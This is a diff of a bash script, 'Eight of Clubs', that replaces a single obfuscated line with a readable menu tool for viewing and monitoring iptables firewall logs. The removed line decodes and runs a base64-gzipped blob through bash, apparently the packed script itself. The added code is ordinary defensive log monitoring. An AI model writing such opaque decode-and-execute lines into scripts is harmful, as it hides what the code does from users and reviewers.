@@ -1,2 +1,57 @@
-cat QREight_of_Clubs 
-bash -c "$(echo H4sICAHINGgAA0VpZ2h0X29mX0NsdWJzALWVUW/aMBDH3/MpbqwSzdQEKN0ehvZQtUya1G0VRZOmTYqMcwEP40S2A0Ntv/vOIbRAKWQV9VNydv46/+5/l7dvGgOhGgNmRp538fP826f672a7/avVaX+Y1L1e96bbL0NNevdQDEc2SpOIy3xgogmq/NiHWw9ocYlMF0/IRykECLWjW6d5X3uM1qBY0cHWE+072LG6Ln9IE7hw+e86udDar/41VcKmGj4LjTMmJVylQwMJRW5ykwku0tzAObdiKux8n/jhsFTI/OVrq3h/JAxwpmMgCunMwDzNwaYwKQGJzLKBRAPSARIKNDIJVkzQnYrRIrfPimepMYK+BsOZUkINT2Cgc4sBgeZ4AqQ/YbKkbTVLEsEhY9aiVibck/mrYmmF8EPgDK6YsfC++YiBfAJdZbXA/T58Tvw0fPDfqm6Bt+fw9h3eF4q3QzK1JIKPlr7UaZZhDNeMj9FWyvsZ8bMQun+Frabwf+Kv00SLcVYMxHKekX9jCDKoURUJEtldA50UHD9SKounxWBkBuFoEaDKeMvcWz5MyRqRRo7KRkVfdDoP26f+snci1ypFp6xst31IivJEcVmVlc0zH9Dhba4G3/klpy9qSs0SlzmGtQ4YiZhBqwNbBvxSAg3j3r3nbeZc4Qewy/zrUP8QRcUktxKCMRllqCmvQEB9+WmdgpYJ2lZO8e4O4gma4f6jKzVT0ILAQKCL8l1rNAaYmsMY524WabSURBiGZfmfInEYNmtTAYNryaBoyTUQZQvTVNvBInm4YSCFwmCQJwlqqvrGjZdXTqAxZbpBBWqMaQiG9FBJ4dCY1j1aAdLmjDle+3H4Fe1y2ft+Xd/qjmLn0LfcFv4HBUrHRVwJAAA= | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+
+eight_of_clubs_menu() {
+    clear
+    echo -e "${CYAN}"
+    echo "      __________________________________________________________________________"
+    echo "     |                            Eight of Clubs                                 |"
+    echo "     |                Monitor Firewall Logs for Suspicious Activity             |"
+    echo "     |__________________________________________________________________________|"
+    echo "     |                                                                          |"
+    echo "     |  This card allows you to monitor iptables logs in real time to detect    |"
+    echo "     |  possible scanning, brute-force, or malicious traffic patterns.          |"
+    echo "     |                                                                          |"
+    echo "     |  1. View Last 50 iptables Log Entries                                    |"
+    echo "     |  2. Monitor iptables Logs in Real Time                                   |"
+    echo "     |  3. Filter Logs for Dropped Packets                                      |"
+    echo "     |  4. Exit                                                                 |"
+    echo "     |__________________________________________________________________________|"
+    echo -e "${RESET}"
+    read -p "Enter your choice: " choice
+    case $choice in
+        1) view_recent_logs ;;
+        2) monitor_realtime ;;
+        3) filter_dropped ;;
+        4) exit 0 ;;
+        *) echo "Invalid choice."; sleep 1; eight_of_clubs_menu ;;
+    esac
+}
+
+view_recent_logs() {
+    clear
+    echo -e "${CYAN}Last 50 iptables Log Entries${RESET}"
+    journalctl -k | grep -i 'iptables' | tail -n 50 || dmesg | grep -i 'iptables' | tail -n 50
+    read -n 1 -s -r -p "Press any key to return..."
+    eight_of_clubs_menu
+}
+
+monitor_realtime() {
+    clear
+    echo -e "${CYAN}Real-Time iptables Log Monitoring${RESET}"
+    journalctl -kf | grep --line-buffered -i 'iptables' || tail -f /var/log/kern.log | grep --line-buffered -i 'iptables'
+    read -n 1 -s -r -p "Press any key to return..."
+    eight_of_clubs_menu
+}
+
+filter_dropped() {
+    clear
+    echo -e "${CYAN}Dropped Packets (iptables logs)${RESET}"
+    journalctl -k | grep -i 'DROP' || dmesg | grep -i 'DROP'
+    read -n 1 -s -r -p "Press any key to return..."
+    eight_of_clubs_menu
+}
+
+eight_of_clubs_menu
